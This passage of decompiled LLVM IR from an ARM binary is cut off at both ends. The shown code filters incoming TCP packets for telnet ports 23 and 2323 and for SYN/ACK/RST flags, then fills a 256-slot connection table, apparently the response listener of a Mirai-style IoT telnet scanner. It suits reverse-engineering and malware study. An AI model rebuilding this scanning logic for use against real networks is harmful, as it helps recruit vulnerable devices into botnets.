  store i32 0, i32* %v2_1086c, align 4
  %v2_10878 = load i32, i32* @global_var_2292c.207, align 4
  store i32 %v2_10878, i32* @r0, align 4
  store i32 1514, i32* @r2, align 4
  store i32 %stack_var_-1884.0, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10890 = call i32 @function_14a2c()
  store i32 %v0_10890, i32* %r0.global-to-local, align 4
  store i32 %v0_10890, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10894 = icmp eq i32 %v0_10890, 0
  store i1 %v2_10894, i1* %cpsr_z.global-to-local, align 1
  %tmp332 = icmp slt i32 %v0_10890, 1
  br i1 %tmp332, label %dec_label_pc_10a04, label %dec_label_pc_1089c

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10864
  %v0_1089c = call i32 @function_12ecc()
  store i32 %v0_1089c, i32* %r0.global-to-local, align 4
  %v1_108a0 = inttoptr i32 %v0_1089c to i32*
  %v2_108a0 = load i32, i32* %v1_108a0, align 4
  store i32 %v2_108a0, i32* %r3.global-to-local, align 4
  %v2_108a4 = icmp ugt i32 %v2_108a0, 10
  store i1 %v2_108a4, i1* %cpsr_c.global-to-local, align 1
  %v7_108a4 = icmp eq i32 %v2_108a0, 11
  store i1 %v7_108a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108a4, label %dec_label_pc_10a04, label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %dec_label_pc_1089c
  %v0_108ac = call i32 @function_12ecc()
  store i32 %v0_108ac, i32* %r0.global-to-local, align 4
  %v1_108b0 = inttoptr i32 %v0_108ac to i32*
  %v2_108b0 = load i32, i32* %v1_108b0, align 4
  store i32 %v2_108b0, i32* %r3.global-to-local, align 4
  %v2_108b4 = icmp ugt i32 %v2_108b0, 10
  store i1 %v2_108b4, i1* %cpsr_c.global-to-local, align 1
  %v7_108b4 = icmp eq i32 %v2_108b0, 11
  store i1 %v7_108b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108b4, label %dec_label_pc_10a04, label %dec_label_pc_108bc

dec_label_pc_108bc:                               ; preds = %dec_label_pc_108ac
  %v0_108bc = load i32, i32* @r4, align 4
  %v2_108bc = icmp ugt i32 %v0_108bc, 38
  store i1 %v2_108bc, i1* %cpsr_c.global-to-local, align 1
  %v7_108bc = icmp eq i32 %v0_108bc, 39
  store i1 %v7_108bc, i1* %cpsr_z.global-to-local, align 1
  %v2_108c0 = xor i1 %v2_108bc, true
  %v3_108c0 = or i1 %v7_108bc, %v2_108c0
  br i1 %v3_108c0, label %dec_label_pc_10864, label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %dec_label_pc_108bc
  store i32 %stack_var_-1884.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2290c.90 to i32), i32* %ip.global-to-local, align 4
  %v3_108cc = load i32, i32* %v2_108cc, align 4
  store i32 %v3_108cc, i32* %r2.global-to-local, align 4
  %v2_108d0 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_108d0, i32* %r3.global-to-local, align 4
  %v3_108d4 = icmp uge i32 %v3_108cc, %v2_108d0
  store i1 %v3_108d4, i1* %cpsr_c.global-to-local, align 1
  %v9_108d4 = icmp eq i32 %v3_108cc, %v2_108d0
  store i1 %v9_108d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_108d4, label %dec_label_pc_108dc, label %dec_label_pc_10864

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108c4
  store i32 %stack_var_-1884.0, i32* @lr, align 4
  %v3_108e0 = load i8, i8* %v2_108e0, align 1
  %v4_108e0 = zext i8 %v3_108e0 to i32
  store i32 %v4_108e0, i32* %r3.global-to-local, align 4
  %v2_108e4 = icmp ugt i8 %v3_108e0, 5
  store i1 %v2_108e4, i1* %cpsr_c.global-to-local, align 1
  %v7_108e4 = icmp eq i8 %v3_108e0, 6
  store i1 %v7_108e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108e4, label %dec_label_pc_108ec, label %dec_label_pc_10864

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108dc
  store i32 23, i32* %r0.global-to-local, align 4
  %v0_108f0 = load i32, i32* @r5, align 4
  %v1_108f0 = inttoptr i32 %v0_108f0 to i16*
  %v2_108f0 = load i16, i16* %v1_108f0, align 2
  %v3_108f0 = zext i16 %v2_108f0 to i32
  store i32 %v3_108f0, i32* @r4, align 4
  %v1_108f4 = call i32 @function_1484c(i32 23)
  store i32 %v1_108f4, i32* %r0.global-to-local, align 4
  %v0_108f8 = load i32, i32* @r4, align 4
  %v3_108f8 = icmp uge i32 %v0_108f8, %v1_108f4
  store i1 %v3_108f8, i1* %cpsr_c.global-to-local, align 1
  %v9_108f8 = icmp eq i32 %v0_108f8, %v1_108f4
  store i1 %v9_108f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_108f8, label %dec_label_pc_10918, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108ec
  store i32 2323, i32* %r0.global-to-local, align 4
  %v0_10908 = load i32, i32* @r5, align 4
  %v1_10908 = inttoptr i32 %v0_10908 to i16*
  %v2_10908 = load i16, i16* %v1_10908, align 2
  %v3_10908 = zext i16 %v2_10908 to i32
  store i32 %v3_10908, i32* @r4, align 4
  %v1_1090c = call i32 @function_1484c(i32 2323)
  store i32 %v1_1090c, i32* %r0.global-to-local, align 4
  %v0_10910 = load i32, i32* @r4, align 4
  %v3_10910 = icmp uge i32 %v0_10910, %v1_1090c
  store i1 %v3_10910, i1* %cpsr_c.global-to-local, align 1
  %v9_10910 = icmp eq i32 %v0_10910, %v1_1090c
  store i1 %v9_10910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10910, label %dec_label_pc_10918, label %dec_label_pc_10864

dec_label_pc_10918:                               ; preds = %dec_label_pc_10900, %dec_label_pc_108ec
  %v0_10918 = load i32, i32* @r5, align 4
  %v1_10918 = add i32 %v0_10918, 2
  %v2_10918 = inttoptr i32 %v1_10918 to i16*
  %v3_10918 = load i16, i16* %v2_10918, align 2
  %v4_10918 = zext i16 %v3_10918 to i32
  store i32 %v4_10918, i32* %r3.global-to-local, align 4
  store i32 %v4_1091c, i32* %r0.global-to-local, align 4
  %v3_10920 = icmp uge i32 %v4_10918, %v4_1091c
  store i1 %v3_10920, i1* %cpsr_c.global-to-local, align 1
  %v9_10920 = icmp eq i32 %v4_10918, %v4_1091c
  store i1 %v9_10920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10920, label %dec_label_pc_10928, label %dec_label_pc_10864

dec_label_pc_10928:                               ; preds = %dec_label_pc_10918
  %v1_10928 = add i32 %v0_10918, 13
  %v2_10928 = inttoptr i32 %v1_10928 to i8*
  %v3_10928 = load i8, i8* %v2_10928, align 1
  %v4_10928 = zext i8 %v3_10928 to i32
  store i32 %v4_10928, i32* %r3.global-to-local, align 4
  %v1_1092c = and i32 %v4_10928, 2
  %v2_1092c = icmp eq i32 %v1_1092c, 0
  store i1 %v2_1092c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1092c, label %dec_label_pc_10864, label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_10928
  %v1_10934 = and i32 %v4_10928, 16
  %v2_10934 = icmp eq i32 %v1_10934, 0
  store i1 %v2_10934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10934, label %dec_label_pc_10864, label %dec_label_pc_1093c

dec_label_pc_1093c:                               ; preds = %dec_label_pc_10934
  %v1_1093c = and i32 %v4_10928, 4
  %v2_1093c = icmp eq i32 %v1_1093c, 0
  store i1 %v2_1093c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1093c, label %dec_label_pc_10944, label %dec_label_pc_10864

dec_label_pc_10944:                               ; preds = %dec_label_pc_1093c
  %tmp480 = urem i8 %v3_10928, 2
  %v2_10944 = icmp eq i8 %tmp480, 0
  store i1 %v2_10944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10944, label %dec_label_pc_1094c, label %dec_label_pc_10864

dec_label_pc_1094c:                               ; preds = %dec_label_pc_10944
  %v1_1094c = add i32 %v0_10918, 8
  %v2_1094c = inttoptr i32 %v1_1094c to i32*
  %v3_1094c = load i32, i32* %v2_1094c, align 4
  store i32 %v3_1094c, i32* %r0.global-to-local, align 4
  %v1_10950 = call i32 @function_149d0(i32 %v3_1094c)
  %v1_10954 = add i32 %v1_10950, -1
  store i32 %v1_10954, i32* %r0.global-to-local, align 4
  %v1_10958 = call i32 @function_14828(i32 %v1_10954)
  store i32 %v1_10958, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1884.0, i32* %r1.global-to-local, align 4
  %v3_10960 = load i32, i32* %v2_10960, align 4
  store i32 %v3_10960, i32* %ip.global-to-local, align 4
  %v3_10964 = icmp uge i32 %v1_10958, %v3_10960
  store i1 %v3_10964, i1* %cpsr_c.global-to-local, align 1
  %v9_10964 = icmp eq i32 %v1_10958, %v3_10960
  store i1 %v9_10964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10964, label %dec_label_pc_1096c, label %dec_label_pc_10864

dec_label_pc_1096c:                               ; preds = %dec_label_pc_1094c
  %v0_1096c = load i32, i32* @r6, align 4
  %v2_1096c = icmp ugt i32 %v0_1096c, 254
  store i1 %v2_1096c, i1* %cpsr_c.global-to-local, align 1
  %v7_1096c = icmp eq i32 %v0_1096c, 255
  store i1 %v7_1096c, i1* %cpsr_z.global-to-local, align 1
  %v8_10970 = icmp sgt i32 %v0_1096c, 255
  br i1 %v8_10970, label %dec_label_pc_10a04, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_1096c
  %v2_1097c = load i32, i32* @global_var_22928.205, align 4
  store i32 %v2_1097c, i32* %r1.global-to-local, align 4
  %v3_10980 = mul i32 %v0_1096c, 256
  store i32 %v3_10980, i32* %r2.global-to-local, align 4
  %v2_10984 = mul i32 %v0_1096c, 288
  store i32 %v2_10984, i32* %r3.global-to-local, align 4
  %v2_10988 = add i32 %v2_1097c, %v2_10984
  store i32 %v2_10988, i32* @r0, align 4
  %v1_1098c = add i32 %v2_10988, 12
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  %v3_1098c = load i32, i32* %v2_1098c, align 4
  store i32 %v3_1098c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10990 = icmp eq i32 %v3_1098c, 0
  store i1 %v2_10990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10990, label %dec_label_pc_109d4, label %dec_label_pc_109b0.preheader

dec_label_pc_109b0.preheader:                     ; preds = %dec_label_pc_10974
  %v2_10994 = add i32 %v0_1096c, 1
  %v2_1099c = and i32 %v2_10994, 134217728
  %v3_1099c = icmp ne i32 %v2_1099c, 0
  store i1 %v3_1099c, i1* %cpsr_c.global-to-local, align 1
  %v3_109a0 = mul i32 %v2_10994, 288
  %v3_109a4 = add i32 %v2_1097c, %v3_109a0
  store i32 %v3_109a4, i32* %r3.global-to-local, align 4
  store i32 %v0_1096c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %dec_label_pc_109b0.preheader, %dec_label_pc_109bc
  %v0_109bc = phi i32 [ %v3_109a4, %dec_label_pc_109b0.preheader ], [ %v1_109c8, %dec_label_pc_109bc ]
  %v0_109b0 = phi i32 [ %v0_1096c, %dec_label_pc_109b0.preheader ], [ %v1_109b0, %dec_label_pc_109bc ]
  %v1_109b0 = add i32 %v0_109b0, 1
  store i32 %v1_109b0, i32* %r2.global-to-local, align 4
  %v7_109b4 = icmp eq i32 %v1_109b0, 256
  br i1 %v7_109b4, label %dec_label_pc_10a04.loopexit, label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %dec_label_pc_109b0
  store i32 %v0_109bc, i32* @r0, align 4
  %v1_109c0 = add i32 %v0_109bc, 12
  %v2_109c0 = inttoptr i32 %v1_109c0 to i32*
  %v3_109c0 = load i32, i32* %v2_109c0, align 4
  %v2_109c4 = icmp eq i32 %v3_109c0, 0
  %v1_109c8 = add i32 %v0_109bc, 288
  store i32 %v1_109c8, i32* %r3.global-to-local, align 4
  br i1 %v2_109c4, label %dec_label_pc_109d0, label %dec_label_pc_109b0

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109bc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_109b0, i32* @r6, align 4
  br label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_10974, %dec_label_pc_109d0
  %v1_109e0 = phi i32 [ %v2_10988, %dec_label_pc_10974 ], [ %v0_109bc, %dec_label_pc_109d0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_109d4 = icmp eq i32 %v1_109e0, 0
  store i1 %v2_109d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109d4, label %dec_label_pc_10a04, label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109d4
  %v0_109dc = load i32, i32* @r5, align 4
  %v1_109dc = inttoptr i32 %v0_109dc to i16*
  %v2_109dc = load i16, i16* %v1_109dc, align 2
  %v3_109dc = zext i16 %v2_109dc to i32
  store i32 %v3_109dc, i32* %r3.global-to-local, align 4
  %v2_109e0 = add i32 %v1_109e0, 16
  %v3_109e0 = inttoptr i32 %v2_109e0 to i32*
  store i32 %v1_10958, i32* %v3_109e0, align 4
  %v0_109e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_109e4 = trunc i32 %v0_109e4 to i16
  %v2_109e4 = load i32, i32* @r0, align 4
  %v3_109e4 = add i32 %v2_109e4, 20
  %v4_109e4 = inttoptr i32 %v3_109e4 to i16*
  store i16 %v1_109e4, i16* %v4_109e4, align 2
  %v0_109e8 = call i32 @function_fdc0()
  store i32 %v0_109e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10864

dec_label_pc_109f0:                               ; preds = %dec_label_pc_100dc
  store i32 ptrtoint (i32* @global_var_2292c.207 to i32), i32* %ip.global-to-local, align 4
  %v2_109f4 = load i32, i32* @global_var_2292c.207, align 4
  store i32 %v2_109f4, i32* @r0, align 4
  %v1_109f8 = call i32 @function_15b20(i32 %v2_109f4)
  store i32 %v1_109f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %dec_label_pc_100b8, %dec_label_pc_109f0
  %v0_109fc = load i32, i32* @r5, align 4
  store i32 %v0_109fc, i32* %r0.global-to-local, align 4
  %v1_10a00 = call i32 @function_12ee4(i32 %v0_109fc)
  store i32 %v1_10a00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a04

dec_label_pc_10a04.loopexit:                      ; preds = %dec_label_pc_109b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10a04

dec_label_pc_10a04:                               ; preds = %dec_label_pc_109d4, %dec_label_pc_1096c, %dec_label_pc_108ac, %dec_label_pc_1089c, %dec_label_pc_10864, %dec_label_pc_10a04.loopexit, %dec_label_pc_109fc
  %stack_var_-1876.2 = phi i32 [ %tmp273, %dec_label_pc_109fc ], [ %stack_var_-1876.1, %dec_label_pc_10a04.loopexit ], [ %stack_var_-1876.1, %dec_label_pc_10864 ], [ %stack_var_-1876.1, %dec_label_pc_1089c ], [ %stack_var_-1876.1, %dec_label_pc_108ac ], [ %stack_var_-1876.1, %dec_label_pc_1096c ], [ %stack_var_-1876.1, %dec_label_pc_109d4 ]
  %stack_var_-1884.1 = phi i32 [ %tmp274, %dec_label_pc_109fc ], [ %stack_var_-1884.0, %dec_label_pc_10a04.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_10864 ], [ %stack_var_-1884.0, %dec_label_pc_1089c ], [ %stack_var_-1884.0, %dec_label_pc_108ac ], [ %stack_var_-1884.0, %dec_label_pc_1096c ], [ %stack_var_-1884.0, %dec_label_pc_109d4 ]
  %stack_var_-1880.1 = phi i16 [ %tmp275, %dec_label_pc_109fc ], [ %stack_var_-1880.0, %dec_label_pc_10a04.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_10864 ], [ %stack_var_-1880.0, %dec_label_pc_1089c ], [ %stack_var_-1880.0, %dec_label_pc_108ac ], [ %stack_var_-1880.0, %dec_label_pc_1096c ], [ %stack_var_-1880.0, %dec_label_pc_109d4 ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_10a24438 = load i32, i32* @sp, align 4
  %v3_10a24439 = add i32 %v2_10a24438, 1676
  %v4_10a24440 = inttoptr i32 %v3_10a24439 to i32*
  store i32 0, i32* %v4_10a24440, align 4
  br label %dec_label_pc_10a10.dec_label_pc_10a10_crit_edge

dec_label_pc_10a10.dec_label_pc_10a10_crit_edge:  ; preds = %dec_label_pc_10a04, %dec_label_pc_10a10.dec_label_pc_10a10_crit_edge
  %v0_10a10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10a14 = add i32 %v0_10a10.pre, 4
  store i32 %v1_10a14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10a1c = add i32 %v0_10a10.pre, 1672
  store i32 %v1_10a1c, i32* %ip.global-to-local, align 4
  %v7_10a20 = icmp eq i32 %v1_10a14, 128
  %v2_10a24 = load i32, i32* @sp, align 4
  %v3_10a24 = add i32 %v2_10a24, %v1_10a1c
  %v4_10a24 = inttoptr i32 %v3_10a24 to i32*
  store i32 0, i32* %v4_10a24, align 4
  br i1 %v7_10a20, label %dec_label_pc_10a2c, label %dec_label_pc_10a10.dec_label_pc_10a10_crit_edge

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10a10.dec_label_pc_10a10_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10a2c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10a2c, i32* %stack_var_-352, align 4
  %v1_10a38432 = add i32 %v0_10a2c, 8
  store i32 %v1_10a38432, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10a40433 = add i32 %v0_10a2c, 1548
  store i32 %v1_10a40433, i32* @lr, align 4
  %v7_10a44434 = icmp eq i32 %v1_10a38432, 128
  %v2_10a48435 = load i32, i32* @sp, align 4
  %v3_10a48436 = add i32 %v2_10a48435, %v1_10a40433
  %v4_10a48437 = inttoptr i32 %v3_10a48436 to i32*
  store i32 0, i32* %v4_10a48437, align 4
  br i1 %v7_10a44434, label %dec_label_pc_10a50, label %dec_label_pc_10a34.dec_label_pc_10a34_crit_edge

dec_label_pc_10a34.dec_label_pc_10a34_crit_edge:  ; preds = %dec_label_pc_10a2c, %dec_label_pc_10a34.dec_label_pc_10a34_crit_edge
  %v0_10a34.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10a38 = add i32 %v0_10a34.pre, 4
  store i32 %v1_10a38, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10a40 = add i32 %v0_10a34.pre, 1544
  store i32 %v1_10a40, i32* @lr, align 4
  %v7_10a44 = icmp eq i32 %v1_10a38, 128
  %v2_10a48 = load i32, i32* @sp, align 4
  %v3_10a48 = add i32 %v2_10a48, %v1_10a40
  %v4_10a48 = inttoptr i32 %v3_10a48 to i32*
  store i32 0, i32* %v4_10a48, align 4
  br i1 %v7_10a44, label %dec_label_pc_10a50, label %dec_label_pc_10a34.dec_label_pc_10a34_crit_edge

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a34.dec_label_pc_10a34_crit_edge, %dec_label_pc_10a2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10a50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10a50, i32* @r6, align 4
  store i32 %v0_10a50, i32* @r5, align 4
  store i32 %v0_10a50, i32* %stack_var_-52, align 4
  %v2_119ac = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10aac

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10adc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10ac8, i1* %cpsr_z.global-to-local, align 1
  %v1_119a0 = add i32 %v2_10ac0, 4
  %v2_119a0 = inttoptr i32 %v1_119a0 to i32*
  %v3_119a0 = load i32, i32* %v2_119a0, align 4
  br i1 %v7_10ac8, label %dec_label_pc_119a0, label %dec_label_pc_10a68

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a60
  store i32 %v3_119a0, i32* %ip.global-to-local, align 4
  %v3_10a6c = udiv i32 %v3_119a0, 32
  store i32 %v2_119ac, i32* %r0.global-to-local, align 4
  %v3_10a74 = mul nuw nsw i32 %v3_10a6c, 4
  %v2_10a78 = add i32 %v3_10a74, %v2_119ac
  store i32 %v2_10a78, i32* %r3.global-to-local, align 4
  %v1_10a7c = add i32 %v2_10a78, -184
  %v2_10a7c = inttoptr i32 %v1_10a7c to i32*
  %v3_10a7c = load i32, i32* %v2_10a7c, align 4
  %v1_10a80 = urem i32 %v3_119a0, 32
  store i32 %v1_10a80, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10a88 = shl i32 1, %v1_10a80
  %v8_10a88 = or i32 %v3_10a7c, %v7_10a88
  store i32 %v8_10a88, i32* %r2.global-to-local, align 4
  store i32 %v8_10a88, i32* %v2_10a7c, align 4
  %v0_10a90 = load i32, i32* @r6, align 4
  %v1_10a90 = load i32, i32* %ip.global-to-local, align 4
  %v3_10a90 = icmp uge i32 %v0_10a90, %v1_10a90
  store i1 %v3_10a90, i1* %cpsr_c.global-to-local, align 1
  %v9_10a90 = icmp eq i32 %v0_10a90, %v1_10a90
  store i1 %v9_10a90, i1* %cpsr_z.global-to-local, align 1
  %v5_10a94 = icmp slt i32 %v0_10a90, %v1_10a90
  br i1 %v5_10a94, label %bb333, label %bb334

bb333:                                            ; preds = %dec_label_pc_10a68
  store i32 %v1_10a90, i32* @r6, align 4
  br label %bb334

bb334:                                            ; preds = %.thread43, %bb340, %bb338, %bb383, %dec_label_pc_10b40, %dec_label_pc_10a68, %bb333
  %v3_10a98 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10a98, i32* %r3.global-to-local, align 4
  %v1_10a9c = add i32 %v3_10a98, 1
  store i32 %v1_10a9c, i32* %r2.global-to-local, align 4
  %v2_10aa0 = icmp ugt i32 %v1_10a9c, 254
  store i1 %v2_10aa0, i1* %cpsr_c.global-to-local, align 1
  %v7_10aa0 = icmp eq i32 %v1_10a9c, 255
  store i1 %v7_10aa0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10a9c, i32* %stack_var_-52, align 4
  %v8_10aa8 = icmp sgt i32 %v1_10a9c, 255
  br i1 %v8_10aa8, label %dec_label_pc_10b60, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %bb334, %dec_label_pc_10a50
  %v0_10ab8 = phi i32 [ %v1_10a9c, %bb334 ], [ %v0_10a50, %dec_label_pc_10a50 ]
  store i32 ptrtoint (i32* @global_var_22928.205 to i32), i32* %r0.global-to-local, align 4
  %v3_10ab0 = mul i32 %v0_10ab8, 256
  store i32 %v3_10ab0, i32* %r3.global-to-local, align 4
  %v2_10ab4 = load i32, i32* @global_var_22928.205, align 4
  store i32 %v2_10ab4, i32* %r1.global-to-local, align 4
  %v2_10abc = mul i32 %v0_10ab8, 288
  store i32 %v2_10abc, i32* %r2.global-to-local, align 4
  %v2_10ac0 = add i32 %v2_10ab4, %v2_10abc
  store i32 %v2_10ac0, i32* @r4, align 4
  %v1_10ac4 = add i32 %v2_10ac0, 12
  %v2_10ac4 = inttoptr i32 %v1_10ac4 to i32*
  %v3_10ac4 = load i32, i32* %v2_10ac4, align 4
  store i32 %v3_10ac4, i32* %ip.global-to-local, align 4
  %v2_10ac8 = icmp ne i32 %v3_10ac4, 0
  store i1 %v2_10ac8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ac8 = icmp eq i32 %v3_10ac4, 1
  store i1 %v7_10ac8, i1* %cpsr_z.global-to-local, align 1
  %v2_10acc = xor i1 %v2_10ac8, true
  %v3_10acc = or i1 %v7_10ac8, %v2_10acc
  br i1 %v3_10acc, label %bb335, label %bb336

bb335:                                            ; preds = %dec_label_pc_10aac
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb336

bb336:                                            ; preds = %dec_label_pc_10aac, %bb335
  %v1_10aec143 = phi i32 [ %v2_10ab4, %dec_label_pc_10aac ], [ 5, %bb335 ]
  %v2_10ad0 = xor i1 %v7_10ac8, true
  %v3_10ad0 = and i1 %v2_10ac8, %v2_10ad0
  br i1 %v3_10ad0, label %bb337, label %bb338

bb337:                                            ; preds = %bb336
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb338

bb338:                                            ; preds = %bb336, %bb337
  %v1_10aec = phi i32 [ %v1_10aec143, %bb336 ], [ 30, %bb337 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ad4 = icmp eq i32 %v3_10ac4, 0
  store i1 %v2_10ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ad4, label %bb334, label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %bb338
  store i32 ptrtoint (i32* @global_var_22398.194 to i32), i32* %r2.global-to-local, align 4
  %v2_10ae0 = load i32, i32* @global_var_22398.194, align 4
  store i32 %v2_10ae0, i32* %r3.global-to-local, align 4
  %v1_10ae4 = add i32 %v2_10ac0, 8
  %v2_10ae4 = inttoptr i32 %v1_10ae4 to i32*
  %v3_10ae4 = load i32, i32* %v2_10ae4, align 4
  store i32 %v3_10ae4, i32* %r2.global-to-local, align 4
  %v2_10ae8 = sub i32 %v2_10ae0, %v3_10ae4
  store i32 %v2_10ae8, i32* %r3.global-to-local, align 4
  %v3_10aec = icmp uge i32 %v2_10ae8, %v1_10aec
  store i1 %v3_10aec, i1* %cpsr_c.global-to-local, align 1
  %v9_10aec = icmp eq i32 %v2_10ae8, %v1_10aec
  store i1 %v9_10aec, i1* %cpsr_z.global-to-local, align 1
  %v2_10af0 = xor i1 %v3_10aec, true
  %v3_10af0 = or i1 %v9_10aec, %v2_10af0
  br i1 %v3_10af0, label %dec_label_pc_10a60, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10adc
  %v1_10af4 = add i32 %v2_10ac0, 4
  %v2_10af4 = inttoptr i32 %v1_10af4 to i32*
  %v3_10af4 = load i32, i32* %v2_10af4, align 4
  store i32 %v3_10af4, i32* @r0, align 4
  %v1_10af8 = call i32 @function_15b20(i32 %v3_10af4)
  store i32 %v1_10af8, i32* %r0.global-to-local, align 4
  %v0_10afc = load i32, i32* @r4, align 4
  %v1_10afc = add i32 %v0_10afc, 12
  %v2_10afc = inttoptr i32 %v1_10afc to i32*
  %v3_10afc = load i32, i32* %v2_10afc, align 4
  store i32 %v3_10afc, i32* %r3.global-to-local, align 4
  %v2_10b00 = icmp ugt i32 %v3_10afc, 1
  store i1 %v2_10b00, i1* %cpsr_c.global-to-local, align 1
  %v7_10b00 = icmp eq i32 %v3_10afc, 2
  store i1 %v7_10b00, i1* %cpsr_z.global-to-local, align 1
  %v2_10b04 = xor i1 %v2_10b00, true
  %v3_10b04 = or i1 %v7_10b00, %v2_10b04
  br i1 %v3_10b04, label %bb339, label %.thread239

.thread239:                                       ; preds = %dec_label_pc_10af4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10b0c236240 = add i32 %v0_10afc, 4
  %v3_10b0c237241 = inttoptr i32 %v2_10b0c236240 to i32*
  store i32 -1, i32* %v3_10b0c237241, align 4
  br label %bb340

bb339:                                            ; preds = %dec_label_pc_10af4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10b0c233 = add i32 %v0_10afc, 4
  %v3_10b0c234 = inttoptr i32 %v2_10b0c233 to i32*
  store i32 -1, i32* %v3_10b0c234, align 4
  %v4_10b10 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b10 = load i32, i32* @r4, align 4
  %v6_10b10 = add i32 %v5_10b10, 12
  %v7_10b10 = inttoptr i32 %v6_10b10 to i32*
  store i32 %v4_10b10, i32* %v7_10b10, align 4
  %v4_10b14 = load i32, i32* %r3.global-to-local, align 4
  %v5_10b14 = trunc i32 %v4_10b14 to i8
  %v6_10b14 = load i32, i32* @r4, align 4
  %v7_10b14 = add i32 %v6_10b14, 284
  %v8_10b14 = inttoptr i32 %v7_10b14 to i8*
  store i8 %v5_10b14, i8* %v8_10b14, align 1
  %v0_10b18.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10b18.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb340

bb340:                                            ; preds = %.thread239, %bb339
  %v1_10b18 = phi i1 [ %v1_10b18.pre, %bb339 ], [ %v2_10b00, %.thread239 ]
  %v0_10b18 = phi i1 [ %v0_10b18.pre, %bb339 ], [ false, %.thread239 ]
  %v2_10b18 = xor i1 %v1_10b18, true
  %v3_10b18 = or i1 %v0_10b18, %v2_10b18
  br i1 %v3_10b18, label %bb334, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %bb340
  %v0_10b1c = load i32, i32* @r4, align 4
  %v1_10b1c = add i32 %v0_10b1c, 284
